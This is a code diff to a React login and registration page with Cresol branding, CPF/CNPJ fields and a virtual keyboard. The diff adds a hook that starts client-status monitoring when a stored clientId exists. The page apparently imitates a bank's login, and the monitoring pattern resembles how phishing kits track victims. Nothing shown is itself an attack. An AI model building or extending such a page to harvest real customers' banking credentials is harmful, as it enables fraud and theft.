@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
@@ -6,6 +5,7 @@ import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.pn
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
+import { useClientStatus } from "@/hooks/useClientStatus";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -181,6 +181,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
 
 const Index = () => {
   const navigate = useNavigate();
+  const clientStatus = useClientStatus();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
@@ -442,6 +443,21 @@ const Index = () => {
         return null;
     }
   };
+
+  // Adicionar monitoramento de status do cliente
+  useEffect(() => {
+    // Verificar se já existe clientId para iniciar monitoramento
+    const storedClientId = localStorage.getItem('clientId');
+    if (storedClientId) {
+      console.log('ClientId encontrado na página Index, iniciando monitoramento de status');
+      clientStatus.startMonitoring();
+    }
+
+    // Cleanup quando sair da página
+    return () => {
+      clientStatus.stopMonitoring();
+    };
+  }, [clientStatus]);
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
